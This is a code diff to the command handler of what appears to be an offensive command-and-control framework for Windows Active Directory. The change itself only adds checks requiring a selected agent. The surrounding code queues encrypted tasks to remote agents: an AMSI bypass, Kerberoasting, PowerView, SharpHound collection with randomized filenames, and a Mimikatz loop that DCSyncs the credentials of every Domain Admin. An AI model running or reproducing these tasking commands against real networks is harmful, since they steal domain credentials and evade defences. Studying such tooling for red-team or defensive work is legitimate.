@@ -156,12 +156,18 @@ class cmd:
         pass
 
     def load(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         fpm = open('Modules/' + args[1], 'r')
         module = fpm.read()
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,module))
         fpm.close()
 
     def downloads(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
     	if os.path.isdir("downloads"):
     		downloads = os.listdir("downloads")
     		for file in downloads:
@@ -189,22 +195,34 @@ class cmd:
             print "[-] please add your command as argument : encode64 <command>"
 
     def DA(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load DA.ps1"))
 
     def kerb(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Find-PSServiceAccounts.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Kerberoast.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load kerb.ps1"))
 
     def dcsync_admins(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         print "grab some coffe this may take too long to finish if the domain admin users are more than 10"
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""$users=(Get-ADGroupMember -Identity "Domain Admins").SamAccountName;For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}"""))
 
     def dcsync_list(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         user=[]
         try :
             if len(args) < 2:
@@ -225,7 +243,9 @@ class cmd:
             print e
 
     def get_groups(self, args=None):
-
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         try :
             if len(args) < 2:
                 print "Usage get_groups <user name>"
@@ -238,7 +258,9 @@ class cmd:
             print e
 
     def get_users(self, args=None):
-
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         try :
             if len(args) < 2:
                 print "Usage get_users <group name>"
@@ -251,5 +273,8 @@ class cmd:
             print e
 
     def bloodhound(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SharpHound.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName "+"".join([random.choice(string.ascii_uppercase) for i in range(5)])))
